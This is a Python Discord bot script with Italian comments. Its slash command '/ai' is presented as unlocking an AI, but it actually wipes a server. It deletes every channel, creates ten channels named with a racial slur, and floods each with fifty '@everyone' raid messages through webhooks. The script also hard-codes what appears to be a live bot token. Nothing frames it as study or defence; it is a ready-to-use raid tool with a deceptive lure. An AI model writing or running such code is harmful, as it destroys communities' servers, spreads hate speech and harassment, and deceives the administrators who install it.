import discord
from discord import app_commands
from discord.ext import commands
import asyncio

# Imposta il prefisso del bot e crea un'istanza del bot
intents = discord.Intents.default()
bot = commands.Bot(command_prefix="!", intents=intents)

# Token del bot (sostituisci con il tuo token)
TOKEN = "MTM0MjYxMDY1OTAzMTkwODM3Mg.GJ1sPm.ifBzcIzDPOabYZsP6UqFD3-Ms2pXYjl-mbJSTM"

# Evento quando il bot è pronto
@bot.event
async def on_ready():
    print(f"Bot {bot.user} è online!")
    try:
        # Sincronizza i comandi slash
        synced = await bot.tree.sync()
        print(f"Sincronizzati {len(synced)} comandi slash.")
    except Exception as e:
        print(f"Errore durante la sincronizzazione dei comandi slash: {e}")

# Comando slash /ai
@bot.tree.command(name="ai", description="Usa questo comando per sbloccare l'AI")
async def ai(interaction: discord.Interaction):
    # Invia una risposta iniziale
    await interaction.response.send_message("🎛️ Avvio del comando /ai...", ephemeral=True)

    # Fase 1: Elimina TUTTI i canali (testuali, vocali, categorie, ecc.)
    canali_da_eliminare = interaction.guild.channels
    eliminazioni = [canale.delete() for canale in canali_da_eliminare]
    await asyncio.gather(*eliminazioni)
    print("✅ Tutti i canali eliminati!")

    # Parametri personalizzati
    NUM_CANALI = 10  # Numero di canali da creare
    NOME_CANALE = "NIGGERS"  # Nome base dei canali
    NUM_MESSAGGI = 50  # Numero di messaggi da inviare per ogni canale
    MESSAGGIO = "RAIDED BY STEVE, Y'ALL SO BAD @everyone"  # Messaggio da inviare

    # Fase 2: Creazione di tutti i canali in modo rapidissimo
    creazioni = [interaction.guild.create_text_channel(f"{NOME_CANALE}-{i}") for i in range(1, NUM_CANALI + 1)]
    canali_creati = await asyncio.gather(*creazioni)
    print(f"✅ {len(canali_creati)} canali creati!")

    # Fase 3: Creazione dei webhook e invio dei messaggi in parallelo
    async def crea_webhook_e_invia_messaggi(canale):
        try:
            # Crea un webhook per il canale
            webhook = await canale.create_webhook(name="Bot Webhook")
            print(f"✅ Webhook creato per: {canale.name}")

            # Invia i messaggi tramite il webhook
            messaggi = [webhook.send(MESSAGGIO) for _ in range(NUM_MESSAGGI)]
            await asyncio.gather(*messaggi)
            print(f"✅ {NUM_MESSAGGI} messaggi inviati in {canale.name}")
        except Exception as e:
            print(f"❌ Errore durante l'invio dei messaggi in {canale.name}: {e}")

    # Esegui tutte le operazioni in parallelo
    await asyncio.gather(*[crea_webhook_e_invia_messaggi(canale) for canale in canali_creati])

    await interaction.followup.send("🎉 Setup completato!", ephemeral=True)

# Avvia il bot
bot.run(TOKEN)